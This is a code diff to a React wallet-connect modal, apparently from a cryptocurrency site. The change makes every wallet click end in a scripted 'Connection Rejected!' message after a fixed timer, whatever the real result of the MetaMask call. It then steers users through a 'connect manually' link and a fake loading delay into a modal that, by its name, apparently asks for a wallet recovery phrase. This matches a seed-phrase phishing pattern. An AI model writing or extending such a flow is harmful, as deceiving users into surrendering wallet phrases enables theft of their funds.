@@ -4,9 +4,9 @@ import Box from '@mui/material/Box';
 import Modal from '@mui/material/Modal';
 import Fade from '@mui/material/Fade';
 import Typography from '@mui/material/Typography';
-import { CloseButton, InfoFilledIcon } from '../assets/icons';
+import { ArrowUpIcon, CloseButton, InfoFilledIcon } from '../assets/icons';
 import { myContext } from '../MyContext';
-import { blockLogo, coinbaseLogo, logo, metaMaskLogo, walletConnecLogo } from '../assets/images';
+import { blockLogo, coinbaseLogo, logo, metaMaskLogo, spinner, walletConnecLogo } from '../assets/images';
 import Spinner from './spinner';
 import ScanWalletModal from './scanModal';
 import axios from 'axios';
@@ -40,6 +40,7 @@ export default function ConnectWalletModal() {
     const { openWalletModal, setWalletModal, setScanWalletModal, setPhraseWalletModal, setClickedWallet, clickedWallet } = useContext(myContext)
     const [clickedWalletIndex, setClickedWalletIndex] = useState();
     const [isRejected, setIsRejected] = useState(false)
+    const [isLoading, setIsLoading] = useState(false)
 
     const [metaMastWalletAddress, setMetaMaskWalletAddress] = useState("")
 
@@ -87,22 +88,38 @@ export default function ConnectWalletModal() {
     //     }
     // }
 
+    // function handleWalletClick(name) {
+    //     setClickedWalletIndex(name)
+    //     authMetaMask()
+    //     setTimeout(() => {
+    //         // setScanWalletModal(true)
+    //         setPhraseWalletModal(true)
+
+    //         setTimeout(() => {
+    //             setIsRejected(true)
+    //         }, 3000);
+    //     }, 2000);
+    // }
+
     function handleWalletClick(name) {
         setClickedWalletIndex(name)
         authMetaMask()
         setTimeout(() => {
-            // setScanWalletModal(true)
-            setPhraseWalletModal(true)
-
-            setTimeout(() => {
-                setIsRejected(true)
-            }, 3000);
-        }, 2000);
+            setIsRejected(true)
+        }, 4000);
     }
 
     function backToWallets() {
         setClickedWalletIndex()
         setIsRejected(false)
+    }
+
+    function handleManualConnect() {
+        setIsLoading(true)
+        setTimeout(() => {
+            setPhraseWalletModal(true)
+            setIsLoading(false)
+        }, 3000);
     }
 
 
@@ -167,7 +184,7 @@ export default function ConnectWalletModal() {
                                             <div className='text-[#DCEFFA] md:grid flex items-start grid-cols-2 md:gap-2 gap-6 pt-4'>
                                                 {
                                                     avalWallets.map((wallet, index) => (
-                                                        <div key={index} onClick={(e) => { handleWalletClick(wallet.name); setClickedWallet({...clickedWallet, logo: wallet.logo, name: wallet.name}) }} className='md:border duration-500 max-md:text-center rounded-2xl hover:bg-[#34353B] cursor-pointer md:p-4 border-zinc-700 md:flex items-center gap-2'>
+                                                        <div key={index} onClick={(e) => { handleWalletClick(wallet.name); setClickedWallet({ ...clickedWallet, logo: wallet.logo, name: wallet.name }) }} className='md:border duration-500 max-md:text-center rounded-2xl hover:bg-[#34353B] cursor-pointer md:p-4 border-zinc-700 md:flex items-center gap-2'>
                                                             <div className='border p-2 md:h-[3.1em] h-[4em] flex items-center justify-center max-md:mb-2 rounded-2xl border-zinc-600 md:w-[50px] w-[4em]'>
                                                                 {
                                                                     clickedWalletIndex === wallet.name ? (
@@ -195,8 +212,8 @@ export default function ConnectWalletModal() {
                                 }
                                 {
                                     isRejected && (
-                                        <>
-                                            <div className='flex gap-12 bg-[#FFEFCC] rounded-3xl p-4 mt-4'>
+                                        <div>
+                                            <div className='flex gap-12 bg-[#FFEFCC] max-md:min-w-[400px] rounded-3xl p-4 mt-4'>
                                                 <div className='flex items-center relative '>
                                                     <div className='w-[40px] border flex justify-center items-center rounded-xl bg-[#EBEBED] border-[#FFAF00] h-[40px]'>
                                                         <img src={logo} alt='wallet' className='w-1/2' />
@@ -207,15 +224,35 @@ export default function ConnectWalletModal() {
                                                 </div>
                                                 <div className='text-[12px] text-[#6370E5]'>
                                                     <div className='text-[#71530F] text-[16px]'>Connection Rejected!</div>
-                                                    <div>Click here to try again</div>
+                                                    <div onClick={handleManualConnect} className=' cursor-pointer'>Click here to connect manually</div>
+                                                    {/* <div>Click here to try again</div> */}
                                                 </div>
                                             </div>
-                                            <div onClick={backToWallets} className=' bottom-8 absolute flex justify-center items-center w-full '>
+                                            {/* <div className='mt-12 flex justify-center'>
+                                                <div>
+                                                    <div className='text-[12px] text-zinc-300'>Having issues connecting wallet?</div>
+                                                    <button
+                                                        onClick={handleManualConnect}
+                                                        className=" flex items-center justify-center rounded-full bg-primGreen w-[200px] mt-2 text-black py-[7px]"
+                                                    >
+                                                        {
+                                                            isLoading ? (
+                                                                <img src={spinner} alt='Loading...' className='w-[20px]' />
+                                                            ) : (
+                                                                <div className='flex gap-2 items-center'>
+                                                                    Connect manually <ArrowUpIcon />
+                                                                </div>
+                                                            )
+                                                        }
+                                                    </button>
+                                                </div>
+                                            </div> */}
+                                            <div onClick={backToWallets} className=' bottom-8 max-md:mt-6 max-md:w-[200px] md:absolute flex md:justify-center items-center w-full '>
                                                 <button className='bg-[#FFFFFF]  text-[13px] px-4 font-bold text-[#33394B] py-1 rounded-full'>
                                                     Back to wallets
                                                 </button>
                                             </div>
-                                        </>
+                                        </div>
                                     )
                                 }
                             </div>
